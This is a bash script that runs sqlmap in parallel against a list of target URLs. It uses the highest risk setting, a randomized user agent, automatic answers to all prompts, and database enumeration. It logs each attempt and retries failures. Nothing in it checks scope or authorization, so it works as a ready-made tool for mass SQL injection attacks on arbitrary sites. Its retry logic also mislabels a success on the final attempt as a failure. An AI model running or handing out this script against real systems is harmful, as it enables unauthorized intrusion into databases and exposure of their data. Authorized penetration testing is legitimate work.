#!/usr/bin/env bash
set -euo pipefail

TARGET_FILE="targets.txt"
LOG_DIR="sqlmap_logs"
CONCURRENCY=5
RETRIES=2
TIMEOUT=10
THREADS=5
LEVEL=3
RISK=3
AGENT_FLAG="--random-agent"
BATCH_FLAG="--batch"

mkdir -p "$LOG_DIR"

# simple FIFO semaphore for concurrency
tmpfifo="/tmp/$$.fifo"
mkfifo "$tmpfifo"
exec 9<>"$tmpfifo"
rm "$tmpfifo"

# seed tokens
for i in $(seq 1 $CONCURRENCY); do
  printf '%s\n' "" >&9
done

run_scan() {
  local url="$1"
  local attempt=0
  local logfile="$LOG_DIR/$(echo "$url" | sed -E 's/[^A-Za-z0-9._-]/_/g').log"

  # basic URL check
  if ! [[ "$url" =~ ^https?:// ]]; then
    echo "[SKIP] Invalid URL: $url" | tee -a "$logfile"
    return
  fi

  while (( attempt <= RETRIES )); do
    ((attempt++))
    echo "[INFO] $(date --iso-8601=seconds) Scanning ($attempt) $url" | tee -a "$logfile"
    sqlmap -u "$url" $BATCH_FLAG $AGENT_FLAG --level="$LEVEL" --risk="$RISK" \
      --dbs --threads="$THREADS" --timeout="$TIMEOUT" 2>&1 | tee -a "$logfile" && break

    echo "[WARN] $(date --iso-8601=seconds) Attempt $attempt failed for $url" | tee -a "$logfile"
    sleep $((attempt * 2))
  done

  if (( attempt > RETRIES )); then
    echo "[ERROR] $(date --iso-8601=seconds) All attempts failed for $url" | tee -a "$logfile"
  else
    echo "[DONE] $(date --iso-8601=seconds) Completed $url" | tee -a "$logfile"
  fi
}

while IFS= read -r url || [[ -n "$url" ]]; do
  read -u 9 || true  # acquire token
  {
    run_scan "$url"
    printf '%s\n' "" >&9  # release token
  } &
done < "$TARGET_FILE"

wait
exec 9>&-  # close
